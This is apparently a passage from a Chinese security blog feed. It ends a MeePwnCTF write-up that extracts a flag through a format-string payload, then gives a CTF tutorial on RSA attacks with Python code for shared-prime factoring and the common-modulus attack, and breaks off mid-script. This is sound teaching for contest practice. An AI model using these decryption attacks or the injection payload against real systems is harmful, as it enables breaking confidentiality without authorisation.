class="keyword">return</span> seq[lo]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">v1, op, v2, s = <span class="string">'T'</span>, <span class="string">"+f"</span>, <span class="string">"ru&#123;FLAG&lt;source or 14:x&#125;"</span>, <span class="string">'a'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    flag += chr(bin_search() - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line"><span class="comment"># MeePwnCTF&#123;python3.6[_strikes_backkkkkkkkkkkk)&#125;</span></span><br></pre></td></tr></table></figure><p><img src="1531905207979.png" alt="1531905207979"></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>CTF中常见的RSA相关问题总结</title>
      <link href="/180727rsa-attack/"/>
      <url>/180727rsa-attack/</url>
      
        <content type="html"><![CDATA[<p><strong>本文首发<a href="https://xz.aliyun.com/t/2446" target="_blank" rel="noopener">先知社区</a> ，转载请注明链接。</strong> </p><h1 id="CTF中常见的RSA相关问题总结"><a href="#CTF中常见的RSA相关问题总结" class="headerlink" title="CTF中常见的RSA相关问题总结"></a>CTF中常见的RSA相关问题总结</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​理解基本概念后，代码就可以说明一切，所以本文将每种攻击方式的实现方法都提炼成了一个函数，在理解原理时会有帮助，在需要时也可以直接调用。</p><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="RSA概要"><a href="#RSA概要" class="headerlink" title="RSA概要"></a>RSA概要</h2><p>在开始前可以通过 <a href="http://www.guideep.com/read?guide=5676830073815040" target="_blank" rel="noopener">《RSA算法详解》</a> 这篇文章了解关于RSA的基础知识，包括加解密方法，算法原理和可行性证明等。</p><h2 id="应用流程"><a href="#应用流程" class="headerlink" title="应用流程"></a>应用流程</h2><ol><li>选取两个较大的互不相等的质数p和q，计算<code>n = p * q</code> 。</li><li>计算<code>phi = (p-1) * (q-1)</code> 。</li><li>选取任意e，使得e满足 <code>1&lt;e&lt;phi</code> 且 <code>gcd(e , phi) == 1</code> 。</li><li>计算e关于 phi 的模逆元d， 即d满足<code>(e * d)% phi ==1</code>  。</li><li>加解密：<code>c = (m ^ e) % n</code> ， <code>m = (c ^ d) % n</code> 。其中m为明文，c为密文，(n,e)为公钥对，d为私钥，要求 <code>0 &lt;= m &lt; n</code> 。</li></ol><h2 id="理解模逆运算"><a href="#理解模逆运算" class="headerlink" title="理解模逆运算"></a>理解模逆运算</h2><ul><li>如果<code>(a*b)%c==1</code> ，那么a和b互为对方模c的模逆元/数论倒数，也写作<img src="1531107643807.png" alt="mod_inv"> 。</li><li>关于最大公约数有一个基本事实：<code>给予两整数a、c，必存在整数x、y使得ax + cy = gcd(a,c)</code>  ，基于这个事实，当a,c互素即<code>gcd(a,c)==1</code> 时，有<code>ax+cy=1</code> ，那么就有<code>(a*x)%c==1</code> ，所以x就是a 对c的模逆元。因此，a对c存在模逆元b的充要条件是<code>gcd(a,c)==1</code> 。显然对于每一组<code>a,c</code> ，存在一族满足条件的x，在求模逆元时我们取得是最小正整数解<code>x mod n</code> 。</li><li>上述的基本事实很容易理解，因为a和c的最大公约数是gcd(a,b)，所以a和c都可表示为gcd(a,b)的整数倍，那么a和b的任意整系数的线性组合ax+by也必定能表示成gcd(a,c)的整数倍，他们当中最小的正整数就应该是gcd(a,c)。实际上最大公约数有一个定义就是：<code>a和b的最大公约数g是a和b的线性和中的最小正整数</code>  。</li></ul><ul><li><p>求模逆元主要基于扩展欧几里得算法，贴一个Python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">egcd</span> <span class="params">( a , b )</span>:</span></span><br><span class="line">     <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         x , y , q = egcd( b , a % b ) <span class="comment"># q = GCD(a, b) = GCD(b, a%b)</span></span><br><span class="line">         x , y = y, ( x - (a // b) * y )</span><br><span class="line">         <span class="keyword">return</span> x, y, q </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_inv</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> egcd(a,b)[<span class="number">0</span>]%b <span class="comment">#求a模b得逆元</span></span><br></pre></td></tr></table></figure></li></ul><ul><li>求模逆也可直接利用gmpy2库。如 <code>import gmpy2;print gmpy2.invert(47,30)</code> 可求得47模30的逆为23。<h2 id="模意义下的运算法则"><a href="#模意义下的运算法则" class="headerlink" title="模意义下的运算法则"></a>模意义下的运算法则</h2></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(a + b) % n ≡ (a % n + b % n) % n</span><br><span class="line">(a - b) % n ≡ (a % n - b % n) % n</span><br><span class="line">(a * b) % n ≡ (a % n * b % n) % n</span><br><span class="line">(a ^ b) % n ≡ ((a % n) ^ b) % n <span class="comment">//幂运算</span></span><br><span class="line"></span><br><span class="line">若 a ≡ b(mod n) ,则</span><br><span class="line"><span class="number">1.</span>对于任意正整数c,有a^c ≡ b^c(mod n)</span><br><span class="line"><span class="number">2.</span>对于任意整数c,有ac ≡ bc(mod n),a+c ≡ b+c(mod n),</span><br><span class="line"><span class="number">3.</span>若 c ≡ d(mod n),则a-c ≡ b-d(mod n),a+c ≡ b+d(mod n),ac ≡ bd(mod n)</span><br><span class="line"></span><br><span class="line">如果ac≡bc (mod m)，且c和m互质，则a≡b (mod m）。</span><br><span class="line">[理解：当且仅当c和m互质,c^<span class="number">-1</span>存在,等式左右可同乘模逆。]</span><br><span class="line"></span><br><span class="line">除法规则：</span><br><span class="line">在模n意义下，a/b不再仅仅代表这两个数相除，而是指 a+k1*n 和 b+k2*n这两个组数中任意两个相除，使商为整数</span><br><span class="line">因此也就可以理解，除以一个数等价于乘以它的逆</span><br><span class="line">a/b ≡ c(mod n) &lt;=&gt; a ≡ c*(b^<span class="number">-1</span>) (mod n)，其中b模n的逆记作b的负一次方。</span><br><span class="line"></span><br><span class="line">费马小定理:</span><br><span class="line">a是整数,p是质数,则a^p==a(mod p),如果a不是p的倍数,还有a^(p<span class="number">-1</span>) ≡ <span class="number">1</span>(mod p)</span><br></pre></td></tr></table></figure><p>推荐文章 <a href="https://blog.sengxian.com/algorithms/mod-world" target="_blank" rel="noopener">模运算总结</a> 和 <a href="https://github.com/wujr5/algorithm-analysis-and-design/blob/master/relative-algorithm-learning/6-algorithm-about-modulo-operation.md" target="_blank" rel="noopener">取模运算涉及的算法</a> 。</p><h2 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h2><p>欧几里得算法是求最大公约数的算法, 也就是中学学的 <a href="https://zh.wikipedia.org/wiki/%E8%BC%BE%E8%BD%89%E7%9B%B8%E9%99%A4%E6%B3%95" target="_blank" rel="noopener">辗转相除法</a> 。记 <code>gcd(a,b)</code> 为a和b的最大公约数，欧几里得算法的基本原理是<code>gcd(a,b)==gcd(b,a%b),(b!=0)</code>  和 <code>gcd(a,0)==a</code> 。</p><p>Python实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 递归版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> a <span class="keyword">if</span> <span class="keyword">not</span> b <span class="keyword">else</span> gcd(b, a % b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 迭代版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd2</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><h2 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h2><p>扩展欧几里得算法基于欧几里得算法，能够求出使得 <code>ax+by=gcd(a,b)</code> 的一组x,y。</p><p><a href="http://blog.miskcoo.com/2014/09/chinese-remainder-theorem#i-3" target="_blank" rel="noopener">这篇文章</a> 解释得很到位，对照下图和以下递归版实现容易理解。</p><p><img src="1531578488892.png" alt="ext_euclid"></p><p>Python实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 递归版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ext_euclid</span> <span class="params">( a , b )</span>:</span></span><br><span class="line">    <span class="comment"># ref:https://zh.wikipedia.org/wiki/扩展欧几里得算法</span></span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x1 , y1 , q = ext_euclid( b , a % b ) <span class="comment"># q = GCD(a, b) = GCD(b, a%b)</span></span><br><span class="line">        x , y = y1, ( x1 - (a // b) * y1 )</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"><span class="comment"># 迭代版</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="comment"># ref:https://blog.csdn.net/wyf12138/article/details/60476773</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)</span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    s1, s2 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    r, q = a % b, a / b</span><br><span class="line">    <span class="keyword">while</span> r:</span><br><span class="line">        m, n = x, y</span><br><span class="line">        x = s1 - x * q</span><br><span class="line">        y = s2 - y * q</span><br><span class="line">        s1, s2 = m, n</span><br><span class="line">        a, b = b, r</span><br><span class="line">        r, q = a % b, a / b</span><br><span class="line">    <span class="keyword">return</span> (x, y, b)</span><br></pre></td></tr></table></figure><h2 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h2><p><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86" target="_blank" rel="noopener">维基百科</a> 给出了简洁生动的说明:</p><p><img src="1531585006464.png" alt="CRT"></p><p>参考以上说明进行的Python实现:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    <span class="comment"># lcm=lambda x , y:x*y/gcd(x,y)</span></span><br><span class="line">    <span class="comment"># mul=lambda x , y:x*y</span></span><br><span class="line">    <span class="comment"># assert(reduce(mul,mi)==reduce(lcm,mi))</span></span><br><span class="line">    <span class="comment"># 以上可用于保证mi两两互质</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br></pre></td></tr></table></figure><p>以上程序将mi当作两两互质处理,实际上有时会遇到其他情况，这时就需要逐一两两合并方程组。我参照下图实现了一个互质与不互质两种情况下都能工作良好的中国剩余定理（解同余方程组）的Python程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(解,最小公倍数)</span></span><br></pre></td></tr></table></figure><p>图片截自  <a href="https://blog.csdn.net/qq_29980371/article/details/71053219" target="_blank" rel="noopener">中国剩余定理（互质与不互质的情况）</a> 。</p><p><img src="1531591884497.png" alt="CRT2"></p><h1 id="常见攻击方式实践"><a href="#常见攻击方式实践" class="headerlink" title="常见攻击方式实践"></a>常见攻击方式实践</h1><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><ul><li>python<ul><li>gmpy2库<ul><li>Windows：可从<a href="https://pypi.org/project/gmpy2/#files" target="_blank" rel="noopener">https://pypi.org/project/gmpy2/#files</a> 直接下载已编译的安装包。</li><li>Linux：  <code>sudo apt install python-gmpy2</code> </li></ul></li><li>libnum库：<ul><li><code>git clone https://github.com/hellman/libnum.git &amp;&amp; cd libnum &amp;&amp; python setup.py install</code> </li></ul></li></ul></li><li>yafu<ul><li><a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="noopener">https://sourceforge.net/projects/yafu/</a> </li></ul></li><li>RSATool2v17.exe</li></ul><h2 id="RSA解密"><a href="#RSA解密" class="headerlink" title="RSA解密"></a>RSA解密</h2><p>若已知私钥d，则可以直接解密： <code>m=pow(c,d,n)</code> 。</p><p>若已知质数p和q，则通过依次计算欧拉函数值phi、私钥d可解密。简易实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_decrypt</span><span class="params">(e, c, p, q)</span>:</span></span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = gmpy2.invert(e, phi) <span class="comment">#求e模phi的逆</span></span><br><span class="line">        <span class="keyword">return</span> pow(c, d, n)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"e and phi are not coprime!"</span></span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure><p>在选取加密指数e时要求phi，e互质，也就是<code>gcd(phi,e)==1</code> ，如果不满足是无法直接解密的。</p><p>为什么说这个呢？是因为有时会有乍一看有点奇怪的情况。比如SCTF2018的<code>Crypto - a number problem</code> ，题目是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x**<span class="number">33</span>=<span class="number">1926041757553905692219721422025224638913707</span> mod <span class="number">3436415358139016629092568198745009225773259</span></span><br><span class="line">tell me the smallest answer of x</span><br></pre></td></tr></table></figure><p>其中<code>n=3436415358139016629092568198745009225773259</code> 可以直接分解得到p,q，出<code>phi=(p-1)*(q-1)</code> ，然后惊奇地发现<code>gcd(phi,33)==3</code> 。这时如果对加密过程比较熟悉的话，就可以想到实际上公钥<code>e=11</code> ，明文是<code>m=x^3</code> ，应该先求出m。然后再爆破x。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000</span>):</span><br><span class="line">    <span class="comment"># 推荐使用gmpy2库运算，用pow开立方不可行</span></span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(m + i * n, <span class="number">3</span>)[<span class="number">1</span>]:</span><br><span class="line">        x = gmpy2.iroot(m + i * n, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># i==243277,x==9420391510958023</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="查询已知的n的可分解情况"><a href="#查询已知的n的可分解情况" class="headerlink" title="查询已知的n的可分解情况"></a>查询已知的n的可分解情况</h2><p>在线查询：<a href="https://factordb.com/" target="_blank" rel="noopener">https://factordb.com/</a> </p><p>api接口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://factordb.com/api?query=12345</span><br><span class="line">response:</span><br><span class="line">&#123;"id":"12345","status":"FF","factors":[["3",1],["5",1],["823",1]]&#125;</span><br></pre></td></tr></table></figure><h2 id="使用yafu分解N"><a href="#使用yafu分解N" class="headerlink" title="使用yafu分解N"></a>使用yafu分解N</h2><p><strong>适用情况：p,q相差较大或较小时可快速分解。</strong></p><p>使用方法：<code>yafu-x64.exe factor(233)</code>  ，<code>yafu-x64.exe help</code></p><h2 id="模不互素-（gcd-N1-N2-1）"><a href="#模不互素-（gcd-N1-N2-1）" class="headerlink" title="模不互素    （gcd(N1,N2)!=1）"></a>模不互素    （<code>gcd(N1,N2)!=1</code>）</h2><p><strong>适用情况：存在两个或更多模数 ，且<code>gcd(N1,N2)!=1</code> 。</strong></p><p>多个模数n共用质数，则可以很容易利用欧几里得算法求得他们的质因数之一<code>gcd(N1,N2)</code>  ，然后这个最大公约数可用于分解模数分别得到对应的p和q，即可进行解密。实现参照本文<code>欧几里得算法</code> 部分和<code>RSA解密</code> 部分。</p><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p><strong>适用情况：明文m、模数n相同，公钥指数e、密文c不同，<code>gcd(e1,e2)==1</code></strong> </p><p>对同一明文的多次加密使用相同的模数和不同的公钥指数可能导致共模攻击。简单证明见代码注释。</p><p>Python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">common_modulus</span><span class="params">(n, e1, e2, c1, c2)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    ref: https://crypto.stackexchange.com/questions/16283/how-to-use-common-modulus-attack</span></span><br><span class="line"><span class="string">    ∵gcd(e1,e2)==1,∴由扩展欧几里得算法，存在e1*s1+e2*s2==1</span></span><br><span class="line"><span class="string">    ∴m==m^1==m^(e1*s1+e2*s2)==((m^e1)^s1)*((m^e2)^s2)==(c1^s1)*(c2^s2)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">assert</span> (libnum.gcd(e1, e2) == <span class="number">1</span>)</span><br><span class="line">    _, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="comment"># 若s1&lt;0，则c1^s1==(c1^-1)^(-s1)，其中c1^-1为c1模n的逆元。</span></span><br><span class="line">    m = pow(c1, s1, n) <span class="keyword">if</span> s1 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c1, n), -s1, n)</span><br><span class="line">    m *= pow(c2, s2, n) <span class="keyword">if</span> s2 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c2, n), -s2, n)</span><br><span class="line">    <span class="keyword">return</span> m % n</span><br></pre></td></tr></table></figure><h3 id="例子：QCTF2018-XMan选拔赛-Xman-RSA-【共模攻击-模不互素】"><a href="#例子：QCTF2018-XMan选拔赛-Xman-RSA-【共模攻击-模不互素】" class="headerlink" title="例子：QCTF2018-XMan选拔赛 / Xman-RSA 【共模攻击+模不互素】"></a>例子：QCTF2018-XMan选拔赛 / Xman-RSA 【共模攻击+模不互素】</h3><p>这道题利用了共模攻击和模不互素。刚开始是一个字符替换，与本文无关。encryption.encrypted文件被做了字符替换，根据语法确定替换表，修复文件得到源文件如下。</p><p>题目附件见文末链接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_num</span><span class="params">(b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(b.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_to_bytes</span><span class="params">(n)</span>:</span></span><br><span class="line">    b = hex(n)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    b = <span class="string">'0'</span> + b <span class="keyword">if</span> len(b) % <span class="number">2</span> == <span class="number">1</span> <span class="keyword">else</span> b</span><br><span class="line">    <span class="keyword">return</span> b.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_a_prime</span><span class="params">(l)</span>:</span></span><br><span class="line">    random_seed = urandom(l)</span><br><span class="line"></span><br><span class="line">    num = bytes_to_num(random_seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> is_prime(num):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(s, e, n)</span>:</span></span><br><span class="line">    p = bytes_to_num(s)</span><br><span class="line">    p = pow(p, e, n)</span><br><span class="line">    <span class="keyword">return</span> num_to_bytes(p).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">separate</span><span class="params">(n)</span>:</span></span><br><span class="line">    p = n % <span class="number">4</span></span><br><span class="line">    t = (p * p) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> t == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"></span><br><span class="line">msg1 = <span class="string">""</span></span><br><span class="line">msg2 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">    <span class="keyword">if</span> separate(i):</span><br><span class="line">        msg2 += flag[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg1 += flag[i]</span><br><span class="line"></span><br><span class="line">p1 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p2 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p3 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n1 = p1 * p2</span><br><span class="line">n2 = p1 * p3</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">c1 = encrypt(msg1, e, n1)</span><br><span class="line">c2 = encrypt(msg2, e, n2)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">p4 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p5 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n3 = p4 * p5</span><br><span class="line">c1 = num_to_bytes(pow(n1, e1, n3)).encode(<span class="string">'hex'</span>)</span><br><span class="line">c2 = num_to_bytes(pow(n1, e2, n3)).encode(<span class="string">'hex'</span>)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(num_to_bytes(n2)))</span><br><span class="line">print(base64.b64encode(num_to_bytes(n3)))</span><br></pre></td></tr></table></figure><p>n2，n3已知，利用共模攻击得到n1，由<code>gcd(n1,n2)==p1</code>  分解n1，n2，就可解密得到两部分msg，拼接即可。</p><p>解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 